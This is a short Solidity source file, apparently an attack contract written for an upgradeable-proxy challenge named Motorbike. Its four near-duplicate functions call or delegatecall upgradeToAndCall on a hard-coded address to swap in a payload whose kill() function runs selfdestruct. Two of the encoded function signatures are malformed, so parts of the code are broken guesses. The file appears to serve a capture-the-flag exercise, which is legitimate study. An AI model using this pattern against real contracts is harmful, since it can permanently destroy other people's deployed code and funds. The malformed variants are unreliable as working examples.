// SPDX-License-Identifier: MIT
pragma solidity 0.8.2;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract Motorbike is Initializable {
      // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader = 0x57315Bf019F60b29d7BAcb7003EC002aAFA3b127;
    uint256 public horsePower;
    address public his = 0x5f861B7d5cB71d9646Ab12fb2Da85406e99a14B3;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        //upgrader = msg.sender;
    }

    function callHisMem()public {
        his.call(abi.encodeWithSignature('upgradeToAndCall(address, bytes memory)',upgrader,abi.encodeWithSignature('kill()')));
    }

    function callHis()public {
        his.call(abi.encodeWithSignature('upgradeToAndCall(address, bytes)',upgrader,abi.encodeWithSignature('kill()')));
    }

    function dcallHisMem()public {
        his.delegatecall(abi.encodeWithSignature('upgradeToAndCall(address, bytes memory)',upgrader,abi.encodeWithSignature('kill()')));
    }

    function dcallHis()public {
        his.delegatecall(abi.encodeWithSignature('upgradeToAndCall(address, bytes)',upgrader,abi.encodeWithSignature('kill()')));
    }

    function kill()public{
        selfdestruct(payable(upgrader));
    }

}